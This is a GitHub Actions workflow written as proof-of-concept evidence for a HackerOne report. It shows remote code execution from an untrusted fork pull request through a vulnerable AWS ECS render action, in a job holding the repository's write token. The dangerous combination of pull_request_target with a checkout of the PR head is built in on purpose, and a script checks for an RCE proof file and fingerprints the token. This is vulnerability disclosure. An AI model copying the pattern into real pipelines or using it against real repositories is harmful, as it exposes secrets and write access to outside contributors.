name: h1-3927165-pr-target-reach

# H1 #3927165 evidence. Shows an external, zero-privilege contributor opening a
# fork PR can get code execution via the vulnerable action, in a job that holds
# the base repo's write GITHUB_TOKEN. pull_request_target runs in the BASE repo
# context with secrets even for fork PRs, which is exactly the danger here.
on:
  pull_request_target:
    branches: [main]

permissions:
  contents: read

jobs:
  render:
    runs-on: ubuntu-latest
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    steps:
      - name: show trigger context (untrusted fork PR)
        run: |
          echo "event=${{ github.event_name }}"
          echo "pr_author=${{ github.event.pull_request.user.login }}"
          echo "pr_author_association=${{ github.event.pull_request.author_association }}"
          echo "head_repo=${{ github.event.pull_request.head.repo.full_name }}"
          echo "base_repo=${{ github.repository }}"

      # DANGEROUS on purpose: pull_request_target + checkout of the PR head =
      # the workspace files (incl. the task-definition.json symlink) are the
      # untrusted contributor's.
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: pre-check (payload not run yet)
        run: test -f RCE_PROOF && { echo "FAIL: proof already present"; exit 1; } || echo "ok, no proof yet"

      - name: run vulnerable action (amazon-ecs-render-task-definition@v1)
        uses: aws-actions/amazon-ecs-render-task-definition@v1
        with:
          task-definition: task-definition.json
          container-name: web
          image: example:latest

      - name: post-check (RCE from fork PR, in a job carrying the write token)
        run: |
          test -f RCE_PROOF || { echo "RCE_PROOF missing, exploit did not fire"; exit 1; }
          echo "RCE from untrusted fork PR head, executed by require() in a privileged job:"
          cat RCE_PROOF
          echo ""
          node -e "const c=require('crypto');const t=process.env.GITHUB_TOKEN||'';console.log('GITHUB_TOKEN in this job: present='+(t.length>0)+' len='+t.length+' sha256_12='+c.createHash('sha256').update(t).digest('hex').slice(0,12))"
